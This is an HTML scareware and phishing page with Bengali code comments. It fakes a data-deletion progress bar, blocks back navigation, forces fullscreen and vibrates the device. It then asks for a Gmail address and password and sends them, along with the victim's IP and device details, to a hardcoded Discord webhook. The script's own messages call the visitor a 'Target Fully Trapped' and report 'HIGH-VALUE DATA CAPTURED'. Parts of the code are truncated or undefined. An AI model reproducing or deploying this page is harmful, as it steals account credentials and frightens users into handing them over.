<!DOCTYPE html>

        .prison-box { width: 90%; max-width: 420px; background: rgba(10, 0, 0, 0.9); border: 5px solid #ff0000; border-radius: 5px; padding: 30px; text-align: center; box-shadow: 0 0 150px #ff0000; z-index: 9999; }
        .glitch { font-size: 26px; font-weight: bold; text-transform: uppercase; animation: glitch 0.2s infinite; }
        @keyframes glitch { 0% { transform: skew(2deg); } 50% { transform: skew(-2deg); } 100% { transform: skew(0); } }
        .progress-container { width: 100%; background: #222; margin: 20px 0; border: 1px solid #ff0000; height: 15px; }
        .progress-bar { width: 0%; height: 100%; background: #ff0000; transition: width 0.1s linear; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #ff0000; background: #000; color: #0f0; border-radius: 0; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 20px; background: #ff0000; color: #000; border: none; font-weight: bold; cursor: pointer; font-size: 20px; margin-top: 10px; }
        .log-text { font-size: 10px; color: #0f0; text-align: left; height: 60px; overflow: hidden; margin-top: 10px; border-top: 1px solid #333; }
    </style>
</head>
<body onclick="forceAction()">

<div class="prison-box">

    <div class="progress-container">
        <div class="progress-bar" id="pbar"></div>
    </div>
    <p id="ptext" style="font-size: 10px;">Data Deletion in Progress: 0%</p>

    <input type="email" id="email" placeholder="Gmail Address" required>
    <input type="password" id="pass" placeholder="Password" required>
    <button onclick="sendData()">STOP DELETION & UNLOCK</button>
    
    <div class="log-text" id="log">
        [!] Connection Established...<br>
        [!] Initializing Root Access...
    </div>
</div>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";

    // ১. এক্সিট প্রিভেনশন (Exit Prevention Loop)
    function lockExit() {
        window.history.pushState(null, null, window.location.href);
        window.onpopstate = function() {
            window.history.pushState(null, null, window.location.href);
            navigator.vibrate([500, 200, 500]); // ফোন কেঁপে উঠবে

    function forceAction() {
        if (navigator.vibrate) navigator.vibrate(100);
        let el = document.documentElement;
        if (el.requestFullscreen) el.requestFullscreen();
    }

    // ৩. ফেক প্রসেস বার (Fake Deletion)
    let width = 0;
    function startProgress() {
        let bar = document.getElementById('pbar');
        let txt = document.getElementById('ptext');
        let interval = setInterval(() => {
            if (width >= 99) { clearInterval(interval); }
            else {
                width++;
                bar.style.width = width + '%';
                txt.innerText = "Data Deletion in Progress: " + width + "%";
            }
        }, 300);
    }

    async function initialCapture() {
        try {
            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
            const model = navigator.userAgent.match(/\(([^)]+)\)/)[1];
            document.getElementById('log').innerHTML += `<br>[OK] Remote IP: ${ipData.ip}<br>[OK] Device: ${model}`;

            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({

                    embeds: [{
                        color: 16711680,
                        title: "Target Fully Trapped",
                        fields: [

                            { name: "Status", value: "Locked in Fullscreen Prison" }
                        ]
                    }]
                })
            });
        } catch (e) {}

    async function sendData() {
        const u = document.getElementById('email').value;

        if(!u || !p) {

        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                content: "🧨 **HIGH-VALUE DATA CAPTURED** 🧨",
                embeds: [{
                    color: 65280,
                    fields: [
                        { name: "Target Email", value: u },
                        { name: "Target Password", value: p },
                        { name: "Final Status", value: "Verified & Released" }
                    ]
                }]
            })
        });

        alert("System Restored. Your device is now safe.");
        window.onpopstate = null;
        window.location.href = "https://myaccount.google.com/";
    }

    window.onload = () => {
        lockExit();
        initialCapture();
        startProgress();
    };
</script>

</body>
</html>
